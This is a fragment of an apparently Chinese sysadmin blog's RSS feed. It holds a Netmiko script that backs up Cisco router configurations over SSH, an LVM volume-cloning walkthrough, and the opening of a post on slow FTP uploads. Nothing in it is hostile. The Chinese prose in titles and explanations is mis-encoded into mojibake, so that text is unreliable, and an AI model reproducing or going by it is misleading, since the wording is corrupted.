&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;secret&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r1_e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r1-e1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.11&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r1_e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r1-e2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.12&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r2_e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r2-e1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.13&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r2_e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r2-e2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.14&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;devices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tw_bgp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r1_e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r1_e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r2_e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r2_e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;devices&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Netmiko&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send_command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;show running-config&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;calender&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;disconnect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;BACKUP for &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; done&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>lvmå·çš„cloneæ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20231208-iscsi_lv_clone/</link>
      <pubDate>Fri, 08 Dec 2023 13:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231208-iscsi_lv_clone/</guid>
      <description>&lt;p&gt;ç”¨pxeè¿œç¨‹å¯åŠ¨ä¸€ä¸ªiscsiå·çš„æ–¹æ³•å·²ç»ä¼šäº†çš„è¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæˆ‘ä»¬è¦æ‰¹é‡äº§æ–°è™šæœºï¼Œæœ€å¿«çš„æ–¹æ³•åº”è¯¥æ˜¯æŠŠè¿œç¨‹çš„iscsiå·cloneä¸€ä¸‹ï¼Œä¾›æ–°çš„è™šæœºç”¨ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨172.18.30.18ä¸Šæ“ä½œ&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŸæ¥æœ‰ä¸¤ä¸ªLVï¼ˆé€»è¾‘å·ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; # lvdisplay
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-iscsi_lv_clone/2020-10-15_165500.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£å°±æŠŠpvc-vis-18-31-48çš„lvmè™šæœºå·ï¼Œå…ˆcopyåšä¸ªmirrorï¼Œ-bå‚æ•°è¡¨ç¤ºåå°è¿è¡Œã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b
  Logical volume vg-targetd/pvc-vis-18-31-48 converted.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æç¤ºä¸€ä¸‹å°±è¿è¡Œå®Œæ¯•äº†ï¼Œè™šå‡å•Šï¼Œåå°æ­£åœ¨è¿è¡ŒåŒæ­¥ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lvs -a -o +devices | egrep &amp;quot;LV|48&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-iscsi_lv_clone/2020-10-15_165157.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹é‚£ä¸ªCpy&amp;amp;Syncï¼Œé‚£ä¸ªæ˜¯è¿›åº¦æ¡ï¼Œæ‰6.91ï¼ŒåŠ¡å¿…ç­‰èµ°åˆ°100ï¼Œå†è¿›è¡Œåç»­æ“ä½œ&lt;/p&gt;
&lt;p&gt;ç„¶åç ´å¼€è¿™ä¸ªmirrorï¼ŒæŠŠå‰¯æœ¬å‘½åä¸ºvis-18-31-49&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48
  Logical volume vg-targetd/pvc-vis-18-31-48 converted.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å†è¿è¡Œ lvdisplay&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231208-iscsi_lv_clone/2020-10-15_165555.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¤šå‡ºä¸€ä¸ªé€»è¾‘å·pvc-vis-18-31-49ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªæ–°å·å»ºç«‹iscsiå¯¹è±¡äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå·è£…çš„Linuxæ˜¯Centos 7 lastï¼Œç½‘å¡æ˜¯dhcpï¼Œå¯ä»¥å½“æ¨¡æ¿å¤ç”¨ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¼€å‘æŠ•è¯‰FTPæ…¢é—®é¢˜çš„è§£å†³</title>
      <link>https://rendoumi.com/posts/20231208-ftp_slowly/</link>
      <pubDate>Fri, 08 Dec 2023 11:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231208-ftp_slowly/</guid>
      <description>&lt;h2 id=&#34;é—®é¢˜è¯´æ˜&#34;&gt;é—®é¢˜è¯´æ˜ï¼š&lt;/h2&gt;
&lt;p&gt;1ã€ç ”å‘åŒäº‹åé¦ˆåº”ç”¨ç¨‹åºä¸Šä¼ ä¸€å¼ å›¾ç‰‡è€—æ—¶6åˆ†é’Ÿï¼Œè®©æˆ‘ä»¬æ’æŸ¥ä¸€ä¸‹æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Ÿ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 2022-03-01 17:16:38.295 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;vu73wwv64ba4ncfzaiiou2qsem&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DubboServerHandler-172.18.32.254:20881-thread-2400&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;FtpFile.java:854:uploadFileToPath&lt;span class=&#34;o&#34;&gt;()]&lt;/span&gt; uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms
